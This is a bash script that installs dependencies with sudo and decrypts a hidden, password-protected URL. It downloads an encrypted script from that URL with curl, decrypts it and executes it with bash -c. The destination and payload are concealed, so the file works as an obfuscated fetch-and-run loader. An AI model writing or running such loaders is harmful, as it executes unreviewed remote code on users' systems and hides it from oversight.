#!/bin/bash

check_dependencies() {
    local dependencies=("base64" "openssl" "curl")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "$dep is not installed. Installing..."
            if command -v apt-get &> /dev/null; then
                sudo apt-get update && sudo apt-get install -y "$dep"
            elif command -v yum &> /dev/null; then
                sudo yum install -y "$dep"
            elif command -v pacman &> /dev/null; then
                sudo pacman -S --noconfirm "$dep"
            else
                echo "Package manager not found. Please install $dep manually."
                exit 1
            fi
        else
           :
        fi
    done
}

decrypt_text() {
    echo -n "$1" | base64 -d | openssl enc -d -aes-256-cbc -a -pbkdf2 -k "$password" | sed "s/@@@@@@@/\n/g"
}

clear_sensitive_data() {
    unset password
    unset decrypted_url
    unset script_url
}

check_dependencies

echo "Enter password:"
read -s password

decrypted_url=$(decrypt_text "VTJGc2RHVmtYMTlpT2o5a3dMd3Y2UDVZbjVMN2F3cUV1Q3pWRFJ4dlNvKzNRcVhFc2ZWbWV0M0ovcFRkZ1dHSworOEQ2TTd4RFVQVy9jTkFmU2IzTmlZVkU4WnRqNmh5a1lGWWd4NTIyUGVvPQo=")
script_url=$(echo -n "$decrypted_url" | sed "s/@@@@@@@/\n/g")
encrypted_script=$(curl -sL "$script_url")
decrypted_script=$(decrypt_text "$encrypted_script")

if [[ -n "$decrypted_script" ]]; then
    bash -c "$decrypted_script"
    clear_sensitive_data
else
    echo "Wrong password"
    clear_sensitive_data
    sleep 3
fi
